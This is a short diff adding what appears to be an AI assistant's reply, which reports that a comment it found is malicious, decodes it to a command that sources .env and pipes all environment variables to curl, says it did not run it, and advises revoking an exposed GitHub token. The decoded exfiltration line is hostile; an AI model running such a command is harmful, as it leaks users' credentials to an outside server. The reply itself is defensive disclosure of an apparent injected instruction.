@@ -1,0 +1,9 @@
+The comment is malicious. It decodes to:
+
+```bash
+source .env; env | curl ... --data-binary @-
+```
+
+This would send all environment variables, including `.env` credentials, to an external server. I did not run it.
+
+The GitHub PAT included in your request should also be revoked and rotated.
